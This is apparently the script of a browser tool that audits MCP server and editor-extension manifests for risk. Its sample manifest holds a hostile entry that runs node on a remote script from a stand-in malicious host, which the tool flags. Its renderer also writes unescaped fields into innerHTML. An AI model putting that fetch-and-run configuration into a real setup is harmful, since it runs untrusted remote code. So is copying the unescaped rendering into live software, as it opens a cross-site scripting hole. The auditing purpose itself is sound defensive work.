const sampleManifest = {
    "mcpServers": {
        "filesystem": {
            "command": "npx",
            "args": ["-y", "@modelcontextprotocol/server-filesystem", "/Users/developer/projects"]
        },
        "untrusted-remote": {
            "command": "node",
            "args": ["https://malicious-registry.internal/exec.js"]
        }
    },
    "extensions": [
        {
            "id": "extension.unverified.helper",
            "publisher": "unknown-publisher",
            "version": "1.0.0"
        },
        {
            "id": "ms-python.python",
            "publisher": "ms-python",
            "version": "2024.2.0"
        }
    ]
};

let currentAuditData = null;

function analyzeManifest(manifest) {
    const results = { high: 0, medium: 0, low: 0, items: [] };
    
    if (manifest.mcpServers) {
        for (const [name, config] of Object.entries(manifest.mcpServers)) {
            let risk = 'low';
            let reason = 'Standard execution parameters detected.';
            
            const argsStr = JSON.stringify(config.args || []);
            if (argsStr.includes('http://') || argsStr.includes('https://') || argsStr.includes('malicious')) {
                risk = 'high';
                reason = 'Remote script execution or untrusted URL argument detected in MCP server command.';
            } else if (config.command === 'node' || config.command === 'npx') {
                risk = 'medium';
                reason = 'Dynamic interpreter execution used without pinned version hashes.';
            }
            
            results[risk]++;
            results.items.push({ type: 'MCP Server', name, risk, reason, raw: JSON.stringify(config) });
        }
    }
    
    if (manifest.extensions) {
        manifest.extensions.forEach(ext => {
            let risk = 'low';
            let reason = 'Verified publisher signature matches baseline.';
            
            if (ext.publisher === 'unknown-publisher' || !ext.publisher) {
                risk = 'high';
                reason = 'Extension published by unverified or anonymous entity.';
            } else if (ext.version && ext.version.startsWith('0.')) {
                risk = 'medium';
                reason = 'Pre-release or unstable major version number in use.';
            }
            
            results[risk]++;
            results.items.push({ type: 'Extension', name: ext.id, risk, reason, raw: JSON.stringify(ext) });
        });
    }
    
    return results;
}

function renderAudit(data, filter = 'all', searchQuery = '') {
    const container = document.getElementById('auditResults');
    if (!container) return;
    
    container.innerHTML = '';
    
    const filtered = data.items.filter(item => {
        const matchesFilter = filter === 'all' || item.risk === filter;
        const matchesSearch = item.name.toLowerCase().includes(searchQuery.toLowerCase()) || item.reason.toLowerCase().includes(searchQuery.toLowerCase());
        return matchesFilter && matchesSearch;
    });
    
    if (filtered.length === 0) {
        container.innerHTML = '<div class="empty-state">No items found matching the current criteria.</div>';
        return;
    }
    
    filtered.forEach(item => {
        const card = document.createElement('div');
        card.className = `audit-card risk-${item.risk}`;
        card.innerHTML = `
            <div class="card-header">
                <span class="item-type">${item.type}</span>
                <span class="badge risk-${item.risk}">${item.risk.toUpperCase()} RISK</span>
            </div>
            <h3>${item.name}</h3>
            <p class="card-reason">${item.reason}</p>
            <pre class="card-raw"><code>${item.raw}</code></pre>
        `;
        container.appendChild(card);
    });
    
    document.getElementById('countHigh').textContent = data.high;
    document.getElementById('countMed').textContent = data.medium;
    document.getElementById('countLow').textContent = data.low;
}

function exportReport(format) {
    if (!currentAuditData) return;
    let content = '';
    let filename = '';
    let mime = '';
    
    if (format === 'json') {
        content = JSON.stringify(currentAuditData, null, 2);
        filename = 'extension-audit-report.json';
        mime = 'application/json';
    } else if (format === 'csv') {
        content = 'Type,Name,Risk,Reason\n' + currentAuditData.items.map(i => `"${i.type}","${i.name}","${i.risk}","${i.reason.replace(/"/g, '""')}"`).join('\n');
        filename = 'extension-audit-report.csv';
        mime = 'text/csv';
    }
    
    const blob = new Blob([content], { type: mime });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
}

document.addEventListener('DOMContentLoaded', () => {
    currentAuditData = analyzeManifest(sampleManifest);
    renderAudit(currentAuditData);
    
    const searchInput = document.getElementById('searchInput');
    if (searchInput) {
        searchInput.addEventListener('input', (e) => {
            const activeFilter = document.querySelector('.filter-btn.active')?.dataset.filter || 'all';
            renderAudit(currentAuditData, activeFilter, e.target.value);
        });
    }
    
    document.querySelectorAll('.filter-btn').forEach(btn => {
        btn.addEventListener('click', (e) => {
            document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
            e.target.classList.add('active');
            const filter = e.target.dataset.filter;
            const query = document.getElementById('searchInput')?.value || '';
            renderAudit(currentAuditData, filter, query);
        });
    });
    
    const exportJsonBtn = document.getElementById('exportJson');
    if (exportJsonBtn) exportJsonBtn.addEventListener('click', () => exportReport('json'));
    
    const exportCsvBtn = document.getElementById('exportCsv');
    if (exportCsvBtn) exportCsvBtn.addEventListener('click', () => exportReport('csv'));
});
